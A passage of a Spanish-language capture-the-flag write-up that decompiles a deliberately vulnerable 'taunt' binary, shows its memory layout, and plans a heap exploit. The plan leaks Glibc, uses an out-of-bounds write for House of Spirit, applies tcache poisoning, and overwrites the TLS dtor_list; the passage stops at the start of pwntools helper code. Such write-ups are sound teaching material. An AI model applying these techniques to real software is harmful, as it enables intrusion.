+</code></pre></div><p>Básicamente, esta función reserva un <em>chunk</em> de <code>0x31</code>, y podemos poner <code>0x1f</code> bytes en el objetivo (<em>target</em>). Si ese valor coincide con el nombre del usuario del principio, la función retorna. De lo contrario, se nos permite meter <code>1023</code> bytes como burla (<em>taunt</em>), y se colocará en un <em>chunk</em> cuyo tamaño está determinado por la longitud de nuestros datos de entrada.</p><p>Además, el puntero a la <code>struct</code> será ha guardado en una <em>array</em> global <code>taunts</code>, cuyo tamaño es 8. No podemos elegir el índice para almacenar la burla en el <em>array</em>.</p><h3 id="función-de-liberación">Función de liberación</h3><p>Aquí tenemos <code>remove_taunt</code> (opción <code>3</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">remove_taunt</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">taunt_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_taunt;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Index: "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (taunt_count </span><span class="mtk5">&lt;=</span><span class="mtk1"> index)) {</span>  
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Index"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (taunts[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Taunt already removed"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    p_taunt </span><span class="mtk5">=</span><span class="mtk1"> taunts[index];</span>
+<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(p_taunt-&gt;taunt);</span>
+<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(p_taunt);</span>
+<span class="mtk1">    taunts[index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Taunt removed"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta función es simple: proporcionamos un índice (se verifica que esté entre los límites), y la función usará <code>free</code> en ambas <code>struct</code> y en el <em>buffer</em> de burla. A continuación, actualiza el <em>array</em> global con un valor <code>NULL</code>. Quizás, lo único extraño es que el número de burlas no disminuye. Como resultado, solo podemos usar <code>create_taunt</code> un total de 8 veces.</p><p>Relacionado con esta función, tenemos la opción <code>4</code>, que es <code>send_taunts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">send_taunts</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Taunting..."</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> taunt_count; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(taunts[i]-&gt;taunt);</span>
+<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(taunts[i]);</span>
+<span class="mtk1">    taunts[i] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>  
+<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta función es bastante inútil, porque simplemente usa <code>free</code> en todas las burlas y finalmente sale del programa.</p><h3 id="otras-funciones">Otras funciones</h3><p>Esta es <code>set_super_taunt</code> (opción <code>5</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">set_super_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">stack_buffer</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> length;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> _length;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (super_taunt_set </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Index for Super Taunt: "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (taunt_count </span><span class="mtk5">&lt;=</span><span class="mtk1"> index)) {</span>  
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error: Invalid Index"</span><span class="mtk1">);</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (taunts[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Taunt was removed..."</span><span class="mtk1">);</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      super_taunt </span><span class="mtk5">=</span><span class="mtk1"> taunts[index];</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Plague to accompany the super taunt: "</span><span class="mtk1">);</span>
+<span class="mtk1">      length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, stack_buffer, </span><span class="mtk6">136</span><span class="mtk1">);</span>
+<span class="mtk1">      _length </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) length;</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Plague entered: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, stack_buffer);</span>
+<span class="mtk1">      super_taunt_plague </span><span class="mtk5">=</span><span class="mtk1"> stack_buffer;</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Registered"</span><span class="mtk1">);</span>
+<span class="mtk1">      super_taunt_set </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Super Taunt already set."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Este es un poco extraña. Se necesita una burla existente, pero nunca la usa. Además, la función recibe un <em>buffer</em> del <em>stack</em> de <code>main</code>, que se usa para leer de <code>stdin</code>. Luego, imprime el <em>buffer</em> que acaba de escribir. Finalmente, escribe unas variables globales <code>super_taunt_plague</code> y <code>super_taunt_set</code>.</p><p>La única razón de existencia de esta función es proporcionar la capacidad de filtrar punteros, porque el <em>buffer</em> del <em>stack</em> no se borra antes de escribir, y no hay byte nulo al final de nuestros datos de entrada.</p><p>La opción <code>1</code> nos permite cambiar nuestro nombre de usuario, que solo se puede hacer una vez:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">change_user</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> length;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> new_user[</span><span class="mtk6">20</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> _length;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> found_space;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (user_changed </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You have already changed the User. There is only </span><span class="mtk4">one life."</span><span class="mtk1">);</span>  
+<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Setting the User is a safeguard against getting d</span><span class="mtk4">estroyed"</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"New User: "</span><span class="mtk1">);</span>
+<span class="mtk1">  length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, new_user, </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
+<span class="mtk1">  _length </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) length;</span>
+<span class="mtk1">  found_space </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">15</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> i) {</span>
+<span class="mtk1">LAB_00101446:</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Old User was </span><span class="mtk6">%s</span><span class="mtk4">...</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, user);</span>
+
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (found_space </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">        user._0_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4620524559414c50</span><span class="mtk1">;</span>
+<span class="mtk1">        user._8_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20454854204d4f52</span><span class="mtk1">;</span>
+<span class="mtk1">        super_taunt_plague </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4c4e4f4954434146</span><span class="mtk1">;</span>
+<span class="mtk1">        _DAT_00104118 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20535345</span><span class="mtk1">;</span>
+<span class="mtk1">        DAT_0010411c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk8">strncpy</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0010411c, new_user, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) _length);</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Updated"</span><span class="mtk1">);</span>
+<span class="mtk1">      user_changed </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (new_user[i] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">' '</span><span class="mtk1">) {</span>
+<span class="mtk1">      found_space </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">goto</span><span class="mtk1"> LAB_00101446;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    i</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Nuevamente, la forma en que se escribe esta función es extraña. En la parte inferior, hay un bucle <code>do</code>-<code>while</code> que analiza la información en <code>new_user</code>, y luego lo sobrescribe con <code>"PLAYER FROM THE FACTIONLESS \0"</code> concatenado con el contenido de <code>new_user</code>.</p><p>Con esto, tenemos una escritura fuera de los límites (OOB, <em>out-of-bounds</em>), porque <code>user</code> es una variable global que tiene solo 16 bytes reservados. Después de esta variable, tenemos el <em>array</em> global <code>super_taunt_plague</code> y <code>taunts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">                        user
+        00104100 00              undefined100h                     [0]
+        00104101 00              undefined100h                     [1]
+        00104102 00              undefined100h                     [2]
+        00104103 00              undefined100h                     [3]
+        00104104 00              undefined100h                     [4]
+        00104105 00              undefined100h                     [5]
+        00104106 00              undefined100h                     [6]
+        00104107 00              undefined100h                     [7]
+        00104108 00              undefined100h                     [8]
+        00104109 00              undefined100h                     [9]
+        0010410a 00              undefined100h                     [10]  
+        0010410b 00              undefined100h                     [11]
+        0010410c 00              undefined100h                     [12]
+        0010410d 00              undefined100h                     [13]
+        0010410e 00              undefined100h                     [14]
+        0010410f 00              undefined100h                     [15]
+
+                        super_taunt_plague
+00104110 00 00 00        undefined8 0000000000000000h
+                00 00 00
+                00 00
+
+                        DAT_00104118
+00104118 00              ??         00h
+00104119 00              ??         00h
+0010411a 00              ??         00h
+0010411b 00              ??         00h
+
+                        DAT_0010411c
+0010411c 00              ??         00h
+0010411d 00              ??         00h
+0010411e 00              ??         00h
+0010411f 00              ??         00h
+
+                        taunts
+        00104120 00 00 00 00 00  taunt_t * 00000000                [0]
+                00 00 00
+        00104128 00 00 00 00 00  taunt_t * 00000000                [1]
+                00 00 00
+        00104130 00 00 00 00 00  taunt_t * 00000000                [2]
+                00 00 00
+        00104138 00 00 00 00 00  taunt_t * 00000000                [3]
+                00 00 00
+        00104140 00 00 00 00 00  taunt_t * 00000000                [4]
+                00 00 00
+        00104148 00 00 00 00 00  taunt_t * 00000000                [5]
+                00 00 00
+        00104150 00 00 00 00 00  taunt_t * 00000000                [6]
+                00 00 00
+        00104158 00 00 00 00 00  taunt_t * 00000000                [7]
+                00 00 00
+
+                        super_taunt
+00104160 00 00 00        undefined8 0000000000000000h
+                00 00 00
+                00 00
+                        taunt_count
+00104168 00 00 00 00     undefined4 00000000h
+0010416c 00              ??         00h
+0010416d 00              ??         00h
+0010416e 00              ??         00h
+0010416f 00              ??         00h
+</code></pre></div><p>Como puede ver, el contenido de <code>new_user</code> se pone en <code>DAT_0010411c</code> (4 bytes), para que podamos corromper fácilmente el primer puntero de <code>taunts</code>.</p><p>Por último, pero no menos importante, esto es <code>setup</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">setup</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdin, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdout, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stderr, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">alarm</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">7f</span><span class="mtk1">);</span>
+<span class="mtk1">  old_malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> __malloc_hook;</span>  
+<span class="mtk1">  __malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> my_malloc_hook;</span>
+<span class="mtk1">  old_free_hook </span><span class="mtk5">=</span><span class="mtk1"> __free_hook;</span>
+<span class="mtk1">  __free_hook </span><span class="mtk5">=</span><span class="mtk1"> my_free_hook;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Además de realizar configuraciones de <em>buffering</em> en <code>stdin</code>, <code>stdout</code> y <code>stderr</code>, configura <code>__malloc_hook</code> y <code>__free_hook</code> con dos funciones personalizadas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk8">my_malloc_hook</span><span class="mtk1">(</span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">ptr;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  __malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> (code </span><span class="mtk5">*</span><span class="mtk1">) old_malloc_hook;</span>  
+<span class="mtk1">  __free_hook </span><span class="mtk5">=</span><span class="mtk1"> (code </span><span class="mtk5">*</span><span class="mtk1">) old_free_hook;</span>
+<span class="mtk1">  ptr </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">malloc</span><span class="mtk1">(param_1);</span>
+<span class="mtk1">  old_malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> __malloc_hook;</span>
+<span class="mtk1">  old_free_hook </span><span class="mtk5">=</span><span class="mtk1"> __free_hook;</span>
+<span class="mtk1">  </span><span class="mtk8">validate_ptr</span><span class="mtk1">(ptr);</span>
+<span class="mtk1">  __malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> my_malloc_hook;</span>
+<span class="mtk1">  __free_hook </span><span class="mtk5">=</span><span class="mtk1"> my_free_hook;</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> ptr;</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">my_free_hook</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
+<span class="mtk1">  __malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> (code </span><span class="mtk5">*</span><span class="mtk1">) old_malloc_hook;</span>
+<span class="mtk1">  __free_hook </span><span class="mtk5">=</span><span class="mtk1"> (code </span><span class="mtk5">*</span><span class="mtk1">) old_free_hook;</span>
+<span class="mtk1">  </span><span class="mtk8">validate_ptr</span><span class="mtk1">(param_1);</span>
+<span class="mtk1">  </span><span class="mtk8">free</span><span class="mtk1">(param_1);</span>
+<span class="mtk1">  old_malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> __malloc_hook;</span>
+<span class="mtk1">  old_free_hook </span><span class="mtk5">=</span><span class="mtk1"> __free_hook;</span>
+<span class="mtk1">  __malloc_hook </span><span class="mtk5">=</span><span class="mtk1"> my_malloc_hook;</span>
+<span class="mtk1">  __free_hook </span><span class="mtk5">=</span><span class="mtk1"> my_free_hook;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Estas funciones están solo para evitar que modifiquemos los <em>hooks</em> para lograr ejecución del código arbitrario (como de costumbre en los retos de explotación del <em>heap</em>). Además, tenemos una función <code>validate_ptr</code> que no nos permitirá asignar un <em>chunk</em> o liberar un <em>chunk</em> dentro de Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">validate_ptr</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">ptr</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((libc_start </span><span class="mtk5">&lt;=</span><span class="mtk1"> ptr) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (ptr </span><span class="mtk5">&lt;=</span><span class="mtk1"> libc_end)) {</span>  
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Did you really think?"</span><span class="mtk1">);</span>
+<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Lo primero que podemos hacer es fugar Glibc usando <code>set_super_taunt</code> (también podríamos haber fugado algunas direcciones del binario para evitar PIE, pero tener Glibc es mucho más potente).</p><p>Después de eso, podemos usar <code>change_name</code> para corromper el <em>array</em> global <code>taunts</code> y modificar el primer puntero (simplemente podemos modificar el byte menos significativo). Con esto, podemos obtener un <code>free</code> arbitrario. Por ejemplo, podemos falsificar un <em>chunk</em> dentro de un <em>buffer</em> <code>taunt_t</code> y llamar a <code>free</code> sobre él (<em>House of Spirit</em>). Como resultado, podremos asignar nuevamente y obtener una situación de <em>chunks</em> solapados, donde podemos modificar un puntero <code>fd</code> de una <em>chunk</em> liberado para realizar un ataque de Tcache <em>poisoning</em> y obtener una primitiva de escritura arbitraria.</p><p>Una vez que tenemos la primitiva de escritura arbitraria, podemos usar <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">TLS-storage <code>dtor_list</code></a>, que usé anteriormente en <a href="../htb-unictf/zombiedote">Zombiedote</a>.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Usaremos las siguientes funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">update_current_user</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New User: '</span><span class="mtk1">, </span><span class="mtk9 mtki">username</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">Updated'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk9 mtki">target</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">taunt</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Taunt target: '</span><span class="mtk1">, </span><span class="mtk9 mtki">target</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Taunt: '</span><span class="mtk1">, </span><span class="mtk9 mtki">taunt</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">remove_taunt</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">set_super_taunt</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">plague</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'5'</span><span class="mtk1">)</span>
